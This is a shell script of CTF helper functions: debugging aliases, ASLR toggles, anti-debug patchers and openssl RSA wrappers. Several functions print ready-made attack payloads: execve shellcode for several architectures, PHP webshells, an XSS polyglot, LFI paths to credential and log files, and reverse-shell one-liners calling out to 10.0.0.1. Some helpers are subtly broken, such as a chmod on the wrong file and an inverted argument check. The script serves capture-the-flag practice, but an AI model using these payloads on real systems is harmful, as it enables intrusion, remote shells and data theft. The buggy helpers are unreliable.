#!/bin/sh
# Lazy functions for ctf

alias rgdb="gdb -ex 'target remote localhost:4444'"
alias asm32="as -msyntax=intel --32 -mnaked-reg -aln -o /dev/null"
alias asm64="as -msyntax=intel --64 -mnaked-reg -aln -o /dev/null"
alias arm-asm="arm-linux-gnueabi-as -aln -o /dev/null"
alias a64-asm="aarch64-linux-gnu-as -aln -o /dev/null"
alias lddd="LD_TRACE_LOADED_OBJECTS=1"
alias LOCALLIB="LD_LIBRARY_PATH=./"
alias NOASLR="setarch `uname -m` -R"
alias findsuid="find . -type f -perm +6000 -ls"
alias findwrite="find / -perm -2 ! -type l -ls"

aslr()
{
    if [ -z $1 ]; then
        cat /proc/sys/kernel/randomize_va_space
    elif [ $1 = "on" ]; then
        sudo sysctl -w kernel.randomize_va_space=2
    elif [ $1 = "off" ]; then
        sudo sysctl -w kernel.randomize_va_space=0
    fi
}

syscall()
{
    grep --color -m 1 "$1" /usr/include/asm/unistd.h /usr/include/asm/unistd_32.h /usr/include/asm/unistd_64.h 2>/dev/null
}

asm2elf()
{
    local out=${2:-"elf.out"}
    nasm -f elf $1 -o asm.o && ld asm.o -m elf_i386 -o $out && rm -f asm.o
}

asm2elf64()
{
    local out=${2:-"elf64.out"}
    nasm -f elf64 $1 -o asm.o && ld asm.o -m elf_x86_64 -o $out && rm -f asm.o

}

pxxd()
{
    if [ -z "$1" ]; then
        xxd -p | awk -F '' '{ for(i=1; i<=NF; i+=2) {printf "\x%s%s", $i,$(i+1);}; printf "\n" }'
    else
        xxd -p "$1" | awk -F '' '{ for(i=1; i<=NF; i+=2) {printf "\x%s%s", $i,$(i+1);}; printf "\n" }'
    fi
}

wgdb()
{
    local pid=`pgrep -n $1`
    while [ "$pid" = "" ]; do
        pid=`pgrep -n $1`
    done
    echo "Attach to $1..."
    gdb -ex continue -p $pid
}

maps()
{
    if [ -z "$1" ]; then
        echo "Usage: $FUNCNAME <proc name>"
    else
        cat /proc/$(pgrep -n $1)/maps
    fi
}

ncat-local()
{
    if [ -z "$1" ]; then
        echo "Usage: $FUNCNAME <command>"
    else
        ncat -vc "$*" -kl localhost 4000 
    fi
}

ncat-strace()
{
    if [ ! -f ${@: -1} ]; then
        echo "${@: -1} not found!"
    else
        ncat -vc "strace -ixv -s 100 $*" -kl localhost 4000 
    fi
}

ncat-ltrace()
{
    if [ ! -f ${@: -1} ]; then
        echo "${@: -1} not found!"
    else
        ncat -vc "ltrace -iC $*" -kl localhost 4000 
    fi
}

ncat-pin()
{
    if [ ! -f $1 ]; then
        echo "PinTool '$1' not found!"
    elif [ ! -f ${@: -1} ]; then
        echo "File '${@: -1}' not found!"
    else
        ncat -kl localhost 4000 -vc "pin -t '${@:1:$#-1}' -- ${@: -1}" 
    fi
}

ncat-gdb()
{
    if [ ! -f ${@: -1} ]; then
        echo "${@: -1} not found!"
    else
        echo ${@: -1} listen on port 4000, gdbserver listen on port 4444
        echo run \'gdb ${@: -1}\' then target remote localhost:4444 in gdb
        echo 

        ncat -vc "gdbserver localhost:4444 $*" -kl localhost 4000 
    fi
}

fuckalarm()
{
    if [ -z $1 ]; then
        echo "Usage: $FUNCNAME <File>"
    elif [ ! -f $1 ]; then
        echo "$1 not found!"
    else
        sed s/alarm/isnan/g "$1" > $1"_noalarm"
        chmod +x $1"_noalarm"
    fi
}

fucksleep()
{
    if [ -z $1 ]; then
        echo "Usage: $FUNCNAME <File>"
    elif [ ! -f $1 ]; then
        echo "$1 not found!"
    else
        sed s/sleep/isnan/g "$1" > $1"_nosleep"
        chmod +x $1"_nosleep"
    fi
}

fuckptrace()
{
    if [ -z $1 ]; then
        echo "usage: $FUNCNAME <File>"
    elif [ ! -f $1 ]; then
        echo "$1 not found!"
    else
        sed s/ptrace/isnanl/g "$1" > $1"_noptrace"
        chmod +x $1"_nosleep"
    fi
}

pwn()
{
    if [ $# -eq 0 ]; then
        echo "[!] Usage: pwn <filename>"
    elif [ -f "$1.py" ]; then
        echo "$1.py already exists!"
    else
        echo "#!/usr/bin/env python
# encoding: utf-8

from pwn import *   # pip install pwntools
#context.log_level = logging.DEBUG

r = remote(\"localhost\", 4000);


r.interactive()" > "$1.py"
    vim "$1.py"
    fi
}

quote()
{
    python -c "print __import__('urllib').quote('$1')"
}

shellcode()
{
    echo "# Linux/x86 execve /bin/sh shellcode 23 bytes"
    echo "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

    echo "# Linux/x86 execve /bin/sh shellcode 25 bytes"
    echo "\xeb\x0b\x5b\x31\xc0\x31\xc9\x31\xd2\xb0\x0b\xcd\x80\xe8\xf0\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68"

    echo "# Linux/x86 execve /bin/sh 28 bytes"
    echo "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"

    echo "# Linux/x64 execve /bin/sh shellcode 27 bytes"
    echo "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

    echo "# Linux/x86/x64 polygot execve /bin/sh"
    echo "\x48\x31\xc0\x48\x85\xc0\x75\x1d\x48\x31\xd2\x52\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x48\x8d\x42\x3b\x0f\x05\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80"

    echo "Linux/ARM - execve("/bin/sh", [0], [0 vars]) - 27 bytes"
    echo "\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x78\x46\x08\x30\x49\x1a\x92\x1a\x0b\x27\x01\xdf\x2f\x62\x69\x6e\x2f\x73\x68"
}

webshell()
{
    echo "<?php \$_GET[a](\$_GET[b]);?>"
    echo "<?php @eval(\$_POST[c]);?>"
    echo "<?php @passthru(\$_POST[1])?>"
    echo "<?php @extract(\$_REQUEST); @die( \$ctime(\$atime) ); ?>"
    echo "<?php @include 'php://input'; ?>"
    echo "<?php (\$_=@\$_GET[2]).@\$_(\$_POST[1]) ?>"
}

xss()
{
    echo "';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//\";
    alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--
    ></SCRIPT>\">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>"
}

lfi()
{
   echo "php://input"
   echo "php://filter/convert.base64-encode/resource="
   echo "/proc/self/environ"
   echo "/proc/self/cmdline"
   echo "/proc/self/fd/x"
   echo "/tmp/sess_"
   echo "/var/lib/php5/sess_"
   echo "/var/log/apache2/access.log"
   echo "/var/log/apache2/access_log"
   echo "/var/log/apache2/error.log"
   echo "/var/log/apache2/error_log"
   echo "/etc/httpd/logs/acces_log"
   echo "/etc/httpd/logs/acces.log"
   echo "/etc/httpd/logs/error_log"
   echo "/etc/httpd/logs/error.log"
   echo "/var/www/logs/access_log"
   echo "/var/www/logs/access.log"
   echo "/var/www/logs/error_log"
   echo "/var/www/logs/error.log"
   echo "/var/log/error_log"
   echo "/var/log/error.log"
   echo "/var/log/auth.log"
   echo "Apache defaut path: http://wiki.apache.org/httpd/DistrosDefaultLayout"
}

rshell()
{
    echo "bash -i > /dev/tcp/[IP]/[port]  0<&1  2>&1"
    echo "bash -i >& /dev/tcp/10.0.0.1/8080 0>&1"
    echo "perl -e \"use Socket;$i='10.0.0.1';$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp'));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,'>&S');open(STDOUT,'>&S');open(STDERR,'>&S');exec('/bin/sh -i');};' }\""
    echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f"
    echo "script -qc 'bash -i' /dev/null &>/dev/tcp/10.0.0.11/1234 <&1"
}

rsa-public()
{
    if [ ! -f $1 ]; then
        echo "$1 not found!"
    else
        openssl rsa -noout -text -pubin -in $1 | tr -d \\n | sed 's/Modulus /Public Key /;s/Modulus:/:/;s/):/)\nN=/;s/Exponent/\ne=/;s/ //g;s/://g'; echo
    fi
}

rsa-private()
{
    if [ ! -f $1 ]; then
        echo "$1 not found!"
    else
        openssl rsa -noout -text -in $1 | tr -d \\n | sed 's/)modulus:/)\nN=/;s/privateExponent:/\nd=/;s/publicExponent:/\n\ne=/;s/prime1/\n\np=/;s/prime2/\n\nq=/;s/exponent.*/\n/g;s/ //g;s/://g';
    fi
}

rsa-expublic()
{
    if [ $# -gt 2 -o $# -lt 1 ]; then
        echo "Usage: $FUNCNAME <private key> <output pem>"
    elif [ ! -f "$1" ]; then
        echo "Private key not found!"
    elif [ ! -f "$2" ]; then
        openssl rsa -in $1 -pubout -out "public.pem"
    else
        openssl rsa -in $1 -pubout -out $2
    fi
}

rsa-enc()
{
    if [ $# -gt 3 -o $# -lt 2 ]; then
        echo "Usage: $FUNCNAME <public key> <input file> <output file>"
    elif [ ! -f "$1" ]; then
        echo "Public key not found!"
    elif [ ! -f "$2" ]; then
        echo "Input file not found!"
    elif [ ! -z "$3" ]; then
        openssl rsautl -encrypt -pubin -inkey $1 -in $2 -out "$2.enc"
    else
        openssl rsautl -encrypt -pubin -inkey $1 -in $2 -out $3
    fi
}

rsa-dec()
{
    if [ $# -gt 3 -o $# -lt 2 ]; then
        echo "Usage: $FUNCNAME <private key> <input file> <output file>"
    elif [ ! -f "$1" ]; then
        echo "Private key not found!"
    elif [ ! -f "$2" ]; then
        echo "Input file not found!"
    elif [ -z "$3" ]; then
        openssl rsautl -decrypt -inkey $1 -in $2 -out "$2.dec"
    else
        openssl rsautl -decrypt -inkey $1 -in $2 -out $3
    fi
}
